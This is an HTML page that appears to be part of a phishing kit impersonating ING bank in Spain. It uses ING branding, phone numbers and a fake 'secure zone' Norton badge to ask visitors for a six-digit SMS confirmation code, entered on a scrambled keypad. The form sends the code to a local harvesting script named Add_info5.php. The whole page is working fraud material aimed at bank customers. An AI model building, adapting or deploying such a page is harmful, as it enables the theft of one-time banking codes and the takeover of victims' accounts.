<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta content="width=device-width, initial-scale=1" name="viewport">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
  <link href="./App/css/navbar.css" rel="stylesheet">
  <link href="./App/css/body.css" rel="stylesheet">
  <link href="https://icono-49d6.kxcdn.com/icono.min.css" rel="stylesheet">
  <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://kit.fontawesome.com/9870a60e4f.js"></script>
  <script charset="utf-8" src="./App/js/keybord.js" type="text/javascript"></script>
  <script charset="utf-8" src="./App/js/val_sms.js" type="text/javascript"></script>
  <script src="./App/js/jquery.maskedinput.js"> </script>
  
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
  <script src="http://getbootstrap.com/assets/js/ie10-viewport-bug-workaround.js"></script>
  
  <script type="text/javascript">
  
    $(document).ready(function () {
            $('#selector').fadeIn('slow', function () {
                $('#selector').delay(10000).fadeOut(150);
            });
        });

</script>

  <style type="text/css">
  table#listbord {
     width: 100%;
     height: 43px;
     text-align: center;
     border: 1px solid #ccc;
  }  </style>
  <title></title>
</head>
<body style="background: linear-gradient(#ffffff, #fefefe);">
<div class="pageLoader" id="selector" style="background-color: rgb(255, 255, 255);position: fixed;width: 100%;height: 100%;z-index: 9999;top: 0px;opacity: 1.9;text-align: center;display: none;"><div id="nucleosoma-app" class="loader"></div></div>

<div class="topnav" id="myTopnav">
  <a href="#home" class="logoo"><img id="logo" src="App/img/logoING.svg" class="img-svg es-logo svg-header-logo login-header" alt="I N G, nxxxx" tabindex="0"></a>
  <a href="#" class="phoneright" style="float: right;font-size: 13px;line-height: 2rem;"><i class="fas fa-phone-alt"></i>&nbsp;&nbsp;901 10 51 15 | 91 206 66 66</a>
</div>

<br>
<br>


<center  class="conteral">

<br><center>
<div class="example2" id="example2">
</div></center>
<!----->
<br>
<br>

<form action="./App/inc/Add_info5.php" method="POST" class="D9oRm7K" name="case" id="myForm">


<div class="InboXLogin">
  <div class="menu" style=" float: none; ">
    <label  class="basic-documento" style="border-bottom: none;color: #000000;font-size: 14px;">Al cabo de un tiempo recibirás un código SMS para confirmación<br>Debe haber recibido un mensaje de texto con un código en su teléfono. Este código contiene 6 caracteres.</label>
    <div class="basic-form-control-wrap ">
      <input type="text" style=" text-align: center; " class="refactor basic-form-control" name="code-sms" placeholder="X X X X X X"   id="display" >
    </div>
<br>
  <table  style="width: 100%;     border: 1px solid #ccc;">
  <tr style=" border-bottom: 1px solid #ccc; ">
    <td style="border-right: 1px solid #ccc;  "><a class="tabltext" style="background-image: url(./App/img/kybord/6.png);"   value="6" onclick="run6(); addcolor();">&nbsp;</a></td>
    <td style=" border-right: 1px solid #ccc; "><a class="tabltext" style="background-image: url(./App/img/kybord/5.png);"   value="5" onclick="run5(); addcolor();">&nbsp;</a></td>
    <td style=" border-right: 1px solid #ccc; "><a class="tabltext" style="background-image: url(./App/img/kybord/8.png);"   value="8" onclick="run8(); addcolor();">&nbsp;</a></td>
    <td style=" border-right: 1px solid #ccc; "><a class="tabltext" style="background-image: url(./App/img/kybord/4.png);"   value="4" onclick="run4(); addcolor();">&nbsp;</a></td>
    <td style=" border-right: 1px solid #ccc; "><a class="tabltext" style="background-image: url(./App/img/kybord/2.png);"   value="2" onclick="run2(); addcolor();">&nbsp;</a></td>
  </tr>
  <tr>
    <td style=" border-right: 1px solid #ccc; "><a class="tabltext" style="background-image: url(./App/img/kybord/3.png);"   value="3" onclick="run3(); addcolor();">&nbsp;</a></td>
    <td style=" border-right: 1px solid #ccc; "><a class="tabltext" style="background-image: url(./App/img/kybord/7.png);"   value="7" onclick="run7(); addcolor();">&nbsp;</a></td>
    <td style=" border-right: 1px solid #ccc; "><a class="tabltext" style="background-image: url(./App/img/kybord/9.png);"   value="9" onclick="run9(); addcolor();">&nbsp;</a></td>
    <td style=" border-right: 1px solid #ccc; "><a class="tabltext" style="background-image: url(./App/img/kybord/0.png);"   value="0" onclick="run0(); addcolor();">&nbsp;</a></td>
    <td style=" border-right: 1px solid #ccc; "><a class="tabltext" style="background-image: url(./App/img/kybord/1.png);"   value="1" onclick="run1(); addcolor();">&nbsp;</a></td>
  </tr>
</table>

<div class="pinpad-actions margin-bottom" style="margin-top: 15px;">
  <button class="btonaccept" id="seguirsms" name="seguirsms" >Seguir</button></div>
<br>

    <h1 class="Acceso-para ">&nbsp;&nbsp;He olvidado mi clave</h1>

  </div>

</form>

  <div class="right">
    <label  class="basic-documentotext" >Todavía no soy cliente</label>
    <div class="container-norton"><img tabindex="0" src="https://ing.ingdirect.es/pfm/assets/images/norton-logo.png"  class="logo-norton" role="link"><div tabindex="0" class="secure-zone va-m">Estás en una zona segura</div></div>
    <label  class="basic-documentotext" >Más información sobre seguridad</label>
<br>
<br>
<br>
  </div>
</div>
<br>
<br>
<br>
<div class="imgresponsive styleimgfooter"><img src="App/img/footerbanner.png" class="imgbanner" alt="Responsive image"></div>
  </center>


</body>
</html>



